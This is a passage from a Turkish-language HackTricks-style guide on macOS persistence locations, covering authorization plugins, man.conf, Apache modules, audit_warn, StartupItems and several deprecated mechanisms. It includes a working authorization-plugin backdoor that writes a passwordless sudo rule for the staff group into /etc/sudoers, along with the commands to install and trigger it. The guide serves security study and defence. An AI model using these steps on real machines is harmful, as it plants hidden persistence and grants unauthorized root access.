Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ek yapılandırmalar yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gerekli
- Plugin'i kullanmak için authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Persistence sağlamak amacıyla bir kullanıcı login olduğunda çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sizi sistemin dışında bırakabilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Bundle'ı yükleneceği konuma taşı**:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak bu Plugin'i yüklemek için **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**, authorization framework'e **authorization için harici bir mechanism çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından yürütülmesini sağlar.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff group sudo** erişimine sahip olmalıdır (onaylamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gerekir
- **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** config dosyası, man documentation dosyaları açılırken kullanılacak binary/script'i belirtir. Böylece executable'ın path'i değiştirilerek kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılabilir.<sup>[[31]](#references)</sup>

Örneğin **`/private/etc/man.conf`** içine şunu ekleyin:
```
MANPAGER /tmp/view
```
Ardından `/tmp/view` dosyasını şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd entitlements içermez

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gerekir
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` içinde aşağıdaki gibi bir satır ekleyerek bir module yüklenmesini belirtebilirsiniz:<sup>[[32]](#references)</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken, ya **geçerli bir Apple sertifikasıyla imzalamak** ya da sisteme **yeni bir güvenilir sertifika ekleyip** dosyayı bununla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatıldığından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekir
- **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama ve Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.<sup>[[33]](#references)</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` ile bir uyarıyı zorla görüntüleyebilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu kullanım dışı bırakılmıştır, bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki özel dosya içermelidir:

1. Bir **rc script'i**: Başlangıçta çalıştırılan bir shell script'i.
2. Özellikle `StartupParameters.plist` olarak adlandırılmış bir **plist dosyası**; bu dosya çeşitli yapılandırma ayarlarını içerir.

Başlangıç işleminin bunları tanıyıp kullanabilmesi için hem rc script'inin hem de `StartupParameters.plist` dosyasının **StartupItem** dizini içine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'umda bulamıyorum; daha fazla bilgi için writeup'a bakın

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple tarafından sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından muhtemelen fark edilmeyecek gizli bir persistence yöntemi olarak kullanılabilir.<sup>[[34]](#references)</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Sistemin bu servise ait LaunchDaemon'u, çalıştırılacak script'leri tek bir dizinde arar. Bunu incelemek için aşağıdaki command kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gerekli
- **Trigger**: XQuartz ile

#### Description & Exploit

XQuartz **artık macOS'a yüklenmemektedir**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Bir kext yüklemek, root olarak bile, o kadar karmaşıktır ki bir exploit'iniz olmadığı sürece bu, pratik bir sandbox-escape veya persistence tekniği olarak kabul edilmez.

#### Location

Bir KEXT'i startup item olarak yüklemek için **aşağıdaki konumlardan birine yüklenmesi gerekir**:

- `/System/Library/Extensions`
- OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
- 3. parti yazılımlar tarafından yüklenen KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını şu şekilde listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions bölümünü kontrol edin**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekli

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service açığa çıkarırken bu binary'yi kullanıyordu... Ancak binary mevcut değildi; dolayısıyla buraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.<sup>[[35]](#references)</sup>

Artık bunu macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekli
- **Trigger**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bunu bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **startup sırasında çalıştırılacak komutlar** yerleştirmek de mümkündür. Normal bir rc.common script'i örneği:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [İyi eski LaunchAgents'ın ötesinde - 1 - shell başlangıç dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [İyi eski LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [İyi eski LaunchAgents'ın ötesinde - 21 - Yeniden açılan Uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [İyi eski LaunchAgents'ın ötesinde - 20 - Terminal Tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [İyi eski LaunchAgents'ın ötesinde - 13 - Audio Plugin'leri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-in'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [İyi eski LaunchAgents'ın ötesinde - 12 - QuickLook Plugin'leri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [İyi eski LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [İyi eski LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [İyi eski LaunchAgents'ın ötesinde - 2 - iTerm2 başlangıcı](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [İyi eski LaunchAgents'ın ötesinde - 7 - xbar plugin'leri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [İyi eski LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [İyi eski LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [İyi eski LaunchAgents'ın ötesinde - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [İyi eski LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [İyi eski LaunchAgents'ın ötesinde - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta Persistence için Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [İyi eski LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [İyi eski LaunchAgents'ın ötesinde - 17 - Renk Seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [İyi eski LaunchAgents'ın ötesinde - 26 - Finder Sync Plugin'leri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence'ını analiz etme (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [İyi eski LaunchAgents'ın ötesinde - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruma: macOS Persistence için Screensaver'lar (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [İyi eski LaunchAgents'ın ötesinde - 11 - Spotlight Importer'ları](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [İyi eski LaunchAgents'ın ötesinde - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [İyi eski LaunchAgents'ın ötesinde - 19 - Periodic Script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [İyi eski LaunchAgents'ın ötesinde - 5 - Pluggable Authentication Module'leri (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [İyi eski LaunchAgents'ın ötesinde - 28 - Authorization Plugin'leri](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugin'leri ile kalıcı Credential hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [İyi eski LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [İyi eski LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [İyi eski LaunchAgents'ın ötesinde - 31 - BSM audit framework'ü](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [İyi eski LaunchAgents'ın ötesinde - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [İyi eski LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [İyi eski LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
